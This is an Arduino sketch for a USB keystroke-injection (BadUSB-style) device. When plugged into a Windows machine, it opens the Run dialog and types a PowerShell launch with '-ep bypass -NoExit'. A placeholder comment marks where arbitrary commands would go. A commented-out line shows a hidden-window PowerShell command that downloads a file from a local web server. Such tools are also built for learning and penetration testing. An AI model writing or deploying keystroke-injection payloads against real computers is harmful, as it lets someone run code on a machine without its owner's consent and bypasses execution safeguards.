#include <Keyboard.h>


//https://docs.arduino.cc/language-reference/en/functions/usb/Keyboard/keyboardModifiers/
void setup() {
  Keyboard.begin();
  delay(3000); // this is necessary for the host to recognize the device

  // Win + R
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();

  delay(500); // wait for the popup

  // write cmd example - idea, doesnt work just by removing the comment below
  //Keyboard.print("powershell -ep bypass -w hidden -c \"Invoke-WebRequest -Uri http://127.0.0.1:13313/test.txt -OutFile 'test.txt'\""); // default is C:\Users\<USER> directory

  Keyboard.print("powershell ");
  // this is for '-' character
  Keyboard.press(KEY_KP_MINUS);
  delay(100);
  Keyboard.releaseAll();
  Keyboard.print("ep bypass ");
  /*
  //example for the hidden parameter "-w hidden"
  Keyboard.press(KEY_KP_MINUS);
  delay(100);
  Keyboard.releaseAll();
  Keyboard.print("w hidden");
  */
  Keyboard.press(KEY_KP_MINUS);
  delay(100);
  Keyboard.releaseAll();
  Keyboard.print("NoExit");

  /*==================================*/
  /*HERE WE COULD JUST PRINT THE COMMANDS WE WANT TO EXECUTE*/
  /*==================================*/



  // Enter
  Keyboard.write(KEY_RETURN);

  Keyboard.end(); // terminate keyboard

}

void loop() {}
